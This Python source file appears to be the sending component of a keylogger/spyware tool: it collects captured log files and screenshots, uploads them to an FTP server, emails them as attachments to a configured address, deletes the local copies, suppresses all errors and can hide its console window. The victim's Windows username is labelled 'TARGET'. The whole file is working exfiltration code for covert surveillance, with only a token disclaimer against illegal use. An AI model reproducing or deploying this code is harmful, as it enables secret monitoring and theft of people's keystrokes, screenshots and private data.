#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
taskprocsend is the partner program to taskproc. This sends all the files captured and logged by taskproc at a
scheduled time each day according to windows task scheduler. Should only be run once.

Email server and FTP server configuration details are inside config.ini. If there is an error reading them, default
information will load.

The user accepts the software license agreement as inclided in the program folder.
Most importantly, do not use this illegally.
"""

import os
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE
from email import encoders
import smtplib
from ftplib import FTP
import configparser
import win32gui, win32console, win32event, win32api,winerror

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 3, 'mutex_var_xboz_')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("no")
    sys.exit(0)


class UnicodeFTP(FTP):
    encoding = "utf-8"

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def email(to_mail):
    """
    Takes today's log file and emails it to/from given email addresses.
    Can easily be modified to send multiple files.
    Google's info: smtp.gmail.com and port:587. username doesn't have @

    Threading code commented out - will just run daily at a certain time with task manager

    Send mail is an enclosed definition in the case that we want to reenable threading.

    :param log_file: log file name

    Actual mail sending handler
    :param send_from: email address send from: name@email.com
    :param send_to: email address to send to: name@email.com
    :param subject: any descriptive text.
    :param text: inner text
    :param files: list of filenames meant to be attached. Currently a solitary tuple, since is set to only send one.
    :param server:  email server.
    :param port: port for email server
    :param username: generally will not include @email.com
    :param password: password string
    :return:
    :return:
    """
    TARGET = os.environ.get("USERNAME")
    SUBJECT = "Today's log for {}".format(TARGET)
    TEXT = "See attached. \nCan also get at ftp://{}:{}/{}".format(FTP_SERVER,FTP_PORT,TARGET)


    msg = MIMEMultipart()
    msg['Subject'] = SUBJECT
    msg['From'] = SEND_FROM
    msg['To'] = COMMASPACE.join(SEND_TO)
    msg.preamble = 'You will not see this in a MIME-aware mail reader.\n'
    msg.attach(MIMEText(TEXT))

    for file in to_mail:
        try:
            part = MIMEBase('application','octet-stream')
            part.set_payload(open(file,'rb').read())
            part.add_header('Content-Disposition', 'attachment', filename="{}".format(os.path.basename(file)))
            msg.attach(part)
            encoders.encode_base64(part)
            os.remove(file)
        except:
            pass

    composed = msg.as_string()

    try:
        with smtplib.SMTP(SERVER,PORT) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(USERNAME,PASSWORD)
            s.sendmail(SEND_FROM,SEND_TO,composed)
    except:
        pass



def upload_to_ftp(to_mail):
    """
    Locally hosted filezilla ftp on port 14147 for listening for admin. 37994 for everything else
    Can access from ports: 89.187.78.114 192.168.1.0/24 192.168.0.101/124
    192.168.0.101 is hosting, AKA whatever IPConfig gives you
    :param log_file: list of log files, or single file. Can handle both
    :return:
    """

    def do_the_thing(file):
        """
        helper function that processes each file, and uploads it to the FTP depending on what kind of file it is.
        :param file: one file's filename
        :return:
        """
        directory = file.split("_")[0]
        try:
            ftp.cwd(directory)
        except:
            ftp.mkd(directory)
            ftp.cwd(directory)
        ext = os.path.splitext(file)[1]
        ftp_binary_store = (ext != ".html" and ext != ".txt")  # if the file isn't a text, ftp_binary is True

        ls = ftp.nlst()
        if file in ls and not ftp_binary_store:
            filename = file.split('.')
            filename.append(filename[1])
            filename[1] = "[1]."
            filename = "".join(part for part in filename)
        else:
            filename = file

        upload_file = open(file,'rb')  # can modify to path.split('/')

        if ftp_binary_store:
            ftp.storbinary('STOR '+ filename, upload_file)  # uploads non-text files
        else:
            ftp.storlines('STOR '+ filename, upload_file)  # uploads text files

        #print(file, " ok") # for debugging
        ftp.cwd("..")


    try:
        # connect to server
        #with FTP((FTP_SERVER,FTP_PORT),FTP_USER,FTP_PASSWORD) as ftp:
        ftp = UnicodeFTP()
        ftp.connect(FTP_SERVER,FTP_PORT)
        ftp.login(FTP_USER,FTP_PASSWORD)

        for f in to_mail:
            do_the_thing(f)

        ftp.close()
        ftp.quit()  # what's the difference between ftp close and quit?

    except:
        pass
        # print(sys.exc_info()[0])  # for debugging
        # traceback.format_exc()


if __name__ == "__main__":
    #hide()  # hides the process as soon as it begins.
    try:  # gets settings from .ini file
        config = configparser.ConfigParser()
        config.read("config1.ini")
        SEND_FROM = config["EMAIL"]["SEND_FROM"]
        if "," in config["EMAIL"]["SEND_TO"]:
            SEND_TO = config["EMAIL"]["SEND_TO"].split(',')
        else:
            SEND_TO = [config["EMAIL"]["SEND_TO"],]
        USERNAME = config["EMAIL"]["USERNAME"]
        PASSWORD = config["EMAIL"]["PASSWORD"]
        SERVER = config["EMAIL"]["SERVER"]
        PORT = int(config["EMAIL"]["PORT"])
        FTP_USER = config["FTP"]["FTP_USER"]
        FTP_PASSWORD = config["FTP"]["FTP_PASSWORD"]
        FTP_SERVER = config["FTP"]["FTP_SERVER"]
        FTP_PORT = int(config["FTP"]["FTP_PORT"])
    except:  # default hardcoded settings if we can't read the ini file
        SEND_FROM = "fakeemail@fake.com"
        SEND_TO = ["fakeemail@fake.com",]
        USERNAME = "fakeemail@fake.com" # or simply fakeemail
        PASSWORD = "fakepassword"
        SERVER = "fakesmtp.mail.server.com"
        PORT = 587
        FTP_USER = "fakeuser"
        FTP_PASSWORD = ''
        FTP_SERVER = '192.168.0.101'
        FTP_PORT = 21
        print("Settings set to default")

    to_mail = []  # initializes the list of items to mail
    for file in os.listdir('.'):  # os.walk('.') if we want to go deeper
        ext = os.path.splitext(file)[1]  # to modify to other text style files
        if ext == '.txt' or ext == '.html':  # if the file is a .txt or .html log file
            to_mail.append(file)  # add to list of files to email
        elif ext == '.bmp' or ext == '.jpg':  # if it's a photo
            to_mail.append(file)  # again, add to list
    upload_to_ftp(to_mail)
    email(to_mail)  # starts process of emailing files, this way we only send one email with multiple attachments